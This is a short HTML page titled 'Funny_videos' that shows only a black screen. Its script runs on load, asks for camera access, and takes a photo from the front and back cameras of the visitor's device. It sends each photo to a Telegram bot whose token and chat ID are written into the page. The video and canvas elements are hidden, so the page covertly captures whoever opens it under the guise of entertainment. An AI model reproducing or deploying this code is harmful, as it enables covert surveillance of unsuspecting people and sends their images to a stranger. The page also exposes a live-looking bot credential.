<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Funny_videos</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
            height: 100%;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
    const CHAT_ID  = "7880376636";

    function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        }).catch(err => console.log("Telegram xato"));
    }

    const cameras = ["user", "environment"]; // old + orqa

    function captureCamera(index) {
        if (index >= cameras.length) return;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: cameras[index] } })
        .then(stream => {
            const video = document.getElementById("video");
            video.srcObject = stream;

            // Video haqiqatdan tayyor bo'lishini kutish
            function tryCapture() {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    const canvas = document.getElementById("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        sendToTelegram(blob);
                        stream.getTracks().forEach(t => t.stop());
                        captureCamera(index + 1);
                    }, "image/jpeg", 0.9);
                } else {
                    requestAnimationFrame(tryCapture); // video tayyor boâ€˜lguncha kutish
                }
            }
            tryCapture();
        })
        .catch(err => console.log("Kameraga ruxsat berilmadi"));
    }

    captureCamera(0);
</script>

</body>
</html>
